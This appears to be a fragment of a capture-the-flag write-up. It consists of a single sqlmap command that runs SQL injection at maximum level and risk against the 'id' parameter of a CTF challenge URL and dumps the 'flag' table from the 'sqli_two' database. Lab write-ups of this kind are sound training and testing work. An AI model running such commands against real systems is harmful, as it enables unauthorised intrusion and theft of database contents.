____

```bash
sqlmap -u "https://3q6m7sai.eu1.ctfio.com/article?id=1" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_two
```

